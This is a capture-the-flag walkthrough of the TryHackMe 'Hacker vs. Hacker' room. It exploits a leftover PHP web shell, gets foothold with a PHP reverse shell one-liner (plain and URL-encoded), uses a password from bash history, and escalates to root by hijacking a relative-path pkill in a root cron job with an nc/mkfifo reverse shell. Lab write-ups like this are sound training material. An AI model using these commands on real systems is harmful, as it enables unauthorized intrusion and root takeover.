---
parent: "[[CTFs - THM]]"
---
```bash
# PLATFORM          . THM
# CTF NAME          . Hacker vs. Hacker
# DESCRIPTION       . Someone has compromised this server already! Can you get in and evade their countermeasures?
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/hackervshacker
```

```
sudo nmap -sSVC -T5 -p- 10.10.243.47 -oN hvh
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9fa60153923a1dbad718185c0d8e922c (RSA)
|   256 4b60dcfb92a86ffc745364c18cbdde7c (ECDSA)
|_  256 83d49cd09036ce83f7c7533028dfc3d5 (ED25519)
	
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: RecruitSec: Industry Leading Infosec Recruitment
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### PORT 80 

- I started by inspecting the source code of the website and I found the following information

```
<!-- im no security expert - thats what we have a stable of nerds for - but isn't /cvs on the public website a privacy risk? -->
```

- However, directory listing is disabled for `/cvs`.

- By inspecting the source code of `/cvs`, we find `upload.php`

```

Hacked! If you dont want me to upload my shell, do better at filtering!

<!-- seriously, dumb stuff:

$target_dir = "cvs/";
$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

if (!strpos($target_file, ".pdf")) {
  echo "Only PDF CVs are accepted.";
} else if (file_exists($target_file)) {
  echo "This CV has already been uploaded!";
} else if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
  echo "Success! We will get back to you.";
} else {
  echo "Something went wrong :|";
}

-->
```

- We see that the (former) script was checking only for the `.pdf` extension of the file.

- I tried uploading a PHP reverse shell called `shell.pdf.php`, but, as expected, it wasn't actually uploading the file anymore, so the upload logic has been removed by the previous attacker.

- However, `/cvs/shell.pdf.php` is the name chosen by the previous attacker. If we access that, we get the following 

```
boom!
```

- So the file is still uploaded. However, if it's a reverse shell, then we have no luck.

- I was thinking that since there's no other way around, this might be actually a web shell and we might find a parameter to execute commands, so I've tried the most obvious one: `?cmd=`. 

```
http://10.10.243.47/cvs/shell.pdf.php?cmd=ls

index.html
shell.pdf.php

boom!
```

- Lucky enough. 

- Since I knew PHP is already installed on the system, I used a PHP reverse shell to get foothold on the system.

```
php -r '$sock=fsockopen("attacker_ip",3131);exec("sh <&3 >&3 2>&3");'
```

- But I've URL-encoded it, resulting in the following final result

```
ip/cvs/shell.pdf.php?cmd=php+-r+%27%24sock%3Dfsockopen%28%22ip%22%2C3131%29%3Bexec%28%22sh+%3C%263+%3E%263+2%3E%263%22%29%3B%27
```

#### PRIVILEGE ESCALTION --- www-data -> lachlan

- The `user.txt` flag is in `/home/lachlan/` and can be read.


- I tried spawning a bash shell but after a short while I was "sent back" to a sh.

```
python3 -c 'import pty;pty.spawn("/bin/bash")

www-data@b2r:/var/www/html/cvs$ nope

ls
index.html
```

- The `nope` message was sent automatically, so there must be some sort of script preventing shell stabilization.
- This would also kill any SSH connections unless used with `-T`, so no TTY is created.

- I fired up `pspy64` and took a look at what is running. Under `root`, i found the following

```
PID=4462 | /bin/sh -c /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done 
```

**NOTE**: There were multiple `PIDs` with different sleep timers that were checking the same thing.

- After poking around some more, I couldn't find anything relevant and I took closer attention to `/home/lachlan`.

- In `.bash_history`, I found the new password of the user

```
cat .bash_history

./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\n{REDACTED}\n{REDACTED}" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```

- `su lachlan`

#### PRIVILEGE ESCALATION --- lachlan -> root

```
Sorry, user lachlan may not run sudo on b2r.
```

- In `/etc/cron.d/persistence`, I found the actual cron that is running the checks preventing us to spawn a bash shell.

```
cat persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```

(I actually found it earlier but it makes much more sense to explain about it now).

- We see that the `backup.sh` is commented out, so we don't care about that.

- However, the PATH is also set to `/home/lachlan/bin` first, so the binaries are searched in that path first.

- All are using their absolute path `EXCEPT pkill`, which is using the relative path. 

- This means that the cron is looking for `pkill` in `/home/lachlan/bin`. If it's not there, in `/bin`. Then in `/usr/bin`. 

```
which pkill
/usr/bin/pkill
```

- If we create a script called `pkill` in `/home/lachlan/bin` and make it executable, it'll get executed as root.

- The content of `pkill` can be anything. I've chosen to be a reverse shell, but could be even a passwd to change root's password or whatever you feel like doing.

```
cd /home/lachlan/bin
touch pkill
echo "#!/bin/bash" > pkill
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc IP 3132 >/tmp/f" >> pkill
chmod +x pkill
```

- On my listener, I've got

```
Listening on 0.0.0.0 3132
Connection received on 10.10.243.47 42206
bash: cannot set terminal process group (5684): Inappropriate ioctl for device
bash: no job control in this shell
root@b2r:~#
```

- The last flag is in `/root/root.txt`.